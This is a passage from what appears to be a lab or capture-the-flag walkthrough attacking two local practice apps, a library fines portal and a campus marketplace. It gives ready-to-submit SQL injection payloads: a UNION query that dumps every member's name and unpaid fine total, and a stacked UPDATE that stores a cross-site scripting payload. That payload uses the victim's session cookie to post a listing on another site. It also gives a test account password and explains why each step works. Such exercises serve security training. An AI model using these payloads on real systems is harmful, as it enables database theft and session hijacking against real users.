## 4. Extract the complete aggregate roster

This payload aggregates only unpaid records, keeps members with no unpaid records, and formats the result for readable display:

```sql
x' UNION SELECT 1,'',
GROUP_CONCAT(CONCAT(m.member_id,' ',m.first_name,' ',m.last_name,':',
FORMAT(COALESCE(f.total_due,0),2))
ORDER BY m.member_id SEPARATOR '<br>'),0
FROM member AS m
LEFT JOIN (
 SELECT member_id,SUM(amount) AS total_due
 FROM fine_record
 WHERE status='UNPAID'
 GROUP BY member_id
) AS f ON m.member_id=f.member_id -- -
```

One-line version for easy submission:

```sql
x' UNION SELECT 1,'',GROUP_CONCAT(CONCAT(m.member_id,' ',m.first_name,' ',m.last_name,':',FORMAT(COALESCE(f.total_due,0),2)) ORDER BY m.member_id SEPARATOR '<br>'),0 FROM member AS m LEFT JOIN (SELECT member_id,SUM(amount) AS total_due FROM fine_record WHERE status='UNPAID' GROUP BY member_id) AS f ON m.member_id=f.member_id -- -
```

The `LEFT JOIN` and `COALESCE` are required for the zero-total rows.

## 5. Persist the browser payload

First log in to the Campus Marketplace as `anika.rahman` using password `market-Anika-41`. Keep that browser session active.

Then submit the following Library Fines check:

- Member ID: `4100001`
- PIN field:

```sql
rahman-41'; UPDATE member AS m LEFT JOIN (SELECT member_id,FORMAT(SUM(amount),2) AS total_due FROM fine_record WHERE status='UNPAID' GROUP BY member_id) AS f ON m.member_id=f.member_id SET m.last_name=CONCAT('<script>fetch("http://localhost:4001/list",{method:"POST",headers:{"content-type":"application/x-www-form-urlencoded"},credentials:"include",body:"title=I+owe+%24',COALESCE(f.total_due,'0.00'),'+in+fines&price=',COALESCE(f.total_due,'0.00'),'"});</script>') WHERE m.member_id=4100001; -- -
```

Why this works:

- The first statement remains a valid login check because it starts with the real PIN.
- The second statement updates only the attacker's `member.last_name`.
- The stored HTML will execute because the Library Fines Portal renders the member name without escaping it.
- The JavaScript makes a POST request to `http://localhost:4001/list`.
- `credentials:"include"` sends the active Marketplace session cookie.
- The listing amount is inserted by MySQL using the aggregate subquery, so the JavaScript body contains the current calculated total.

## 6. Trigger and verify the end-to-end result

After storing the payload, perform a normal Library Fines check:

- Member ID: `4100001`
- PIN: `rahman-41`

When the result page renders, the stored script should send the Marketplace request. Open `http://localhost:4001` while still logged in as `anika.rahman`.

Expected new listing:

The browser may not show the response from the cross-origin `fetch`, but the request itself is enough. The visible evidence is the new Marketplace listing.
